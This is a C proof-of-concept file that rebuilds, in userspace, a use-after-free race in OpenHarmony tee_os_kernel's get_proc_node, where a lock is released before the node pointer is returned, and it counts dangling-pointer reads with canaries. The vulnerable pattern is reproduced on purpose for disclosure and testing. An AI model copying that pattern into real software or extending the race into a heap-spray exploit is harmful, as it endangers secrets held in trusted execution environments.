/**
 * PoC: Use-After-Free in get_proc_node (proc_node.c:246)
 * OpenHarmony tee_os_kernel
 *
 * Demonstrates UAF: get_proc_node returns a pointer after releasing the lock,
 * allowing another thread to free the node before the caller uses it.
 *
 * Build: gcc -o poc poc.c -lpthread -O2
 * ASan:  gcc -fsanitize=address -o poc poc.c -lpthread -O2
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <stdatomic.h>
#include <unistd.h>

typedef unsigned int badge_t;

#define BADGE_TARGET 0x1234
#define NUM_ITERATIONS 50000
#define CANARY_VALUE 0xCAFEBABE
#define FREED_MARKER 0xDEADDEAD

/* Simplified proc_node matching tee_os_kernel structure */
struct hlist_node {
    struct hlist_node *next;
};

struct hlist_head {
    struct hlist_node *first;
};

struct proc_node {
    struct hlist_node hash_node;
    badge_t badge;
    unsigned int canary;      /* To detect UAF */
    char sensitive_data[64];  /* Simulates TA session keys/state */
    int refcount;
};

/* Simplified hash table */
#define HTABLE_BUCKETS 16
static struct hlist_head badge2proc[HTABLE_BUCKETS];
static pthread_mutex_t proc_nodes_lock = PTHREAD_MUTEX_INITIALIZER;

static atomic_int uaf_detected = 0;
static atomic_int freed_access_count = 0;
static atomic_int ready = 0;

static struct hlist_head *htable_get_bucket(badge_t badge)
{
    return &badge2proc[badge % HTABLE_BUCKETS];
}

/* Insert a proc_node into the hash table */
static void insert_proc_node(struct proc_node *proc)
{
    struct hlist_head *bucket = htable_get_bucket(proc->badge);
    proc->hash_node.next = bucket->first;
    bucket->first = &proc->hash_node;
}

/* Remove a proc_node from the hash table */
static void remove_proc_node(struct proc_node *proc)
{
    struct hlist_head *bucket = htable_get_bucket(proc->badge);
    struct hlist_node **pp = &bucket->first;
    while (*pp) {
        if (*pp == &proc->hash_node) {
            *pp = proc->hash_node.next;
            return;
        }
        pp = &(*pp)->next;
    }
}

/*
 * Vulnerable get_proc_node - exact pattern from proc_node.c:246
 * BUG: Returns pointer AFTER releasing the lock. Another thread can
 * free the node between unlock and the caller's use of the pointer.
 */
static struct proc_node *get_proc_node(badge_t client_badge)
{
    struct proc_node *proc;
    struct hlist_head *bucket;
    struct hlist_node *node;

    pthread_mutex_lock(&proc_nodes_lock);
    bucket = htable_get_bucket(client_badge);

    /* Walk the bucket list */
    node = bucket->first;
    while (node) {
        proc = (struct proc_node *)((char *)node -
               __builtin_offsetof(struct proc_node, hash_node));
        if (client_badge == proc->badge) {
            goto out;
        }
        node = node->next;
    }

    pthread_mutex_unlock(&proc_nodes_lock);
    return NULL;

out:
    pthread_mutex_unlock(&proc_nodes_lock);
    /* BUG: Lock released, proc pointer is now unprotected!
     * Another thread can free this node immediately. */
    return proc;
}

/* Simulates free_proc_node_resource + free(proc) from exit path */
static void free_proc_node_resource(struct proc_node *proc)
{
    pthread_mutex_lock(&proc_nodes_lock);
    remove_proc_node(proc);
    pthread_mutex_unlock(&proc_nodes_lock);

    /* Mark as freed for detection */
    proc->canary = FREED_MARKER;
    memset(proc->sensitive_data, 'F', sizeof(proc->sensitive_data));
    free(proc);
}

/*
 * Thread A: Repeatedly looks up the proc_node and uses it.
 * After get_proc_node returns, the pointer may already be freed.
 */
static void *lookup_thread(void *arg)
{
    while (!atomic_load(&ready)) {}

    for (int i = 0; i < NUM_ITERATIONS; i++) {
        struct proc_node *proc = get_proc_node(BADGE_TARGET);
        if (!proc) continue;

        /* --- UAF WINDOW ---
         * Between get_proc_node returning and this access,
         * free_thread may have freed the node.
         */

        /* Small delay to widen race window */
        for (volatile int j = 0; j < 10; j++) {}

        /* Dereference the potentially-freed pointer */
        if (proc->canary == FREED_MARKER) {
            atomic_fetch_add(&uaf_detected, 1);
            fprintf(stderr, "[UAF] Thread %lu: accessed freed proc_node! "
                    "canary=0x%X (expected 0x%X)\n",
                    (unsigned long)pthread_self(),
                    proc->canary, CANARY_VALUE);
        } else if (proc->canary != CANARY_VALUE) {
            atomic_fetch_add(&freed_access_count, 1);
            fprintf(stderr, "[CORRUPTION] Thread %lu: canary corrupted! "
                    "value=0x%X\n",
                    (unsigned long)pthread_self(), proc->canary);
        }
    }
    return NULL;
}

/*
 * Thread B: Repeatedly frees and re-creates the proc_node.
 * Simulates TA exit/cleanup path.
 */
static void *free_thread(void *arg)
{
    while (!atomic_load(&ready)) {}

    for (int i = 0; i < NUM_ITERATIONS; i++) {
        /* Free current node */
        pthread_mutex_lock(&proc_nodes_lock);
        struct hlist_head *bucket = htable_get_bucket(BADGE_TARGET);
        struct hlist_node *node = bucket->first;
        struct proc_node *proc = NULL;
        while (node) {
            struct proc_node *p = (struct proc_node *)((char *)node -
                   __builtin_offsetof(struct proc_node, hash_node));
            if (p->badge == BADGE_TARGET) {
                proc = p;
                break;
            }
            node = node->next;
        }

        if (proc) {
            remove_proc_node(proc);
            pthread_mutex_unlock(&proc_nodes_lock);

            proc->canary = FREED_MARKER;
            memset(proc->sensitive_data, 'X', sizeof(proc->sensitive_data));
            free(proc);
        } else {
            pthread_mutex_unlock(&proc_nodes_lock);
        }

        /* Re-create node to keep the race going */
        struct proc_node *new_proc = calloc(1, sizeof(*new_proc));
        if (new_proc) {
            new_proc->badge = BADGE_TARGET;
            new_proc->canary = CANARY_VALUE;
            memcpy(new_proc->sensitive_data, "SECRET_TA_KEY_DATA", 18);

            pthread_mutex_lock(&proc_nodes_lock);
            insert_proc_node(new_proc);
            pthread_mutex_unlock(&proc_nodes_lock);
        }
    }
    return NULL;
}

int main(void)
{
    pthread_t t_lookup[4], t_free;

    printf("=== PoC: Use-After-Free in get_proc_node (proc_node.c:246) ===\n");
    printf("OpenHarmony tee_os_kernel\n\n");
    printf("Race: get_proc_node returns pointer after releasing lock.\n");
    printf("       Another thread frees node -> caller has dangling pointer.\n\n");

    /* Initialize with a target node */
    struct proc_node *initial = calloc(1, sizeof(*initial));
    initial->badge = BADGE_TARGET;
    initial->canary = CANARY_VALUE;
    memcpy(initial->sensitive_data, "SECRET_TA_KEY_DATA", 18);
    insert_proc_node(initial);

    /* Create threads */
    for (int i = 0; i < 4; i++) {
        pthread_create(&t_lookup[i], NULL, lookup_thread, NULL);
    }
    pthread_create(&t_free, NULL, free_thread, NULL);

    /* Start race */
    atomic_store(&ready, 1);

    /* Wait */
    for (int i = 0; i < 4; i++) {
        pthread_join(t_lookup[i], NULL);
    }
    pthread_join(t_free, NULL);

    printf("\n=== Results ===\n");
    printf("UAF accesses detected (freed marker seen): %d\n",
           atomic_load(&uaf_detected));
    printf("Corrupted canary detections:               %d\n",
           atomic_load(&freed_access_count));

    int total = atomic_load(&uaf_detected) + atomic_load(&freed_access_count);
    if (total > 0) {
        printf("\n[VULNERABLE] Use-After-Free confirmed!\n");
        printf("  Dangling pointer was dereferenced %d times after free.\n", total);
        printf("  In real TEE: attacker controls freed memory via heap spray,\n");
        printf("  hijacks proc_node to escalate privileges or leak secrets.\n");
        return 1;
    } else {
        printf("\n[NOTE] Race not triggered in this run (timing-dependent).\n");
        printf("  Run with ASan: gcc -fsanitize=address -o poc poc.c -lpthread\n");
        printf("  ASan will detect the UAF reliably.\n");
        return 0;
    }
}
